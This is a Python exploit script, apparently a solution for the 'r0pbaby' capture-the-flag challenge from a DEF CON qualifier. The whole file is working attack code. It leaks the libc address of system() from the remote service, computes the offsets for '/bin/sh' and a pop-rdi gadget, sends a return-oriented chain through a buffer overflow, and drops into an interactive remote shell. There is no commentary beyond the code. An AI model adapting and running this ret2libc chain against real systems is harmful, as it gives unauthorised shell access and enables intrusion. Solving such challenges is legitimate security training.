#!/usr/bin/env python
import sc_pwn
from struct import *
import sys

#rhp = ('192.168.75.129',8080)
rhp = ('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me',10436)

offset_libc_exit    = 0x000000000003c290
offset_libc_system  = 0x0000000000046640
offset_libc_str_sh  = 0x000000000017ccdb
offset_libc_poprdi  = 0x0000000000022b1a

#==========

def attack(nc):
    nc.read_until(': ')
    nc.sendln('2')
    nc.read_until(': ')
    nc.sendln('system')

    addr_libc_system    = int(nc.read_all().split()[2],16)
    addr_base_libc      = addr_libc_system - offset_libc_system
    
    addr_libc_exit      = addr_base_libc + offset_libc_exit
    addr_libc_str_sh    = addr_base_libc + offset_libc_str_sh
    addr_libc_poprdi    = addr_base_libc + offset_libc_poprdi

    sys.stdout.write('[+]addr_exit      = 0x%016x\n' % addr_libc_exit)
    sys.stdout.write('[+]addr_system    = 0x%016x\n' % addr_libc_system)
    sys.stdout.write('[+]addr_str_sh    = 0x%016x\n' % addr_libc_str_sh)
    
    exploit  = '\x00'*0x8
    exploit += pack('<Q', addr_libc_poprdi)
    exploit += pack('<Q', addr_libc_str_sh)
    exploit += pack('<Q', addr_libc_system)
    exploit += pack('<Q', addr_libc_exit)

    nc.sendln('3')
    nc.read_until(': ')
    nc.sendln(str(len(exploit)))
    nc.send(exploit)
    nc.sendln('4')
    nc.read_all()

#==========
    
if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)

#==========
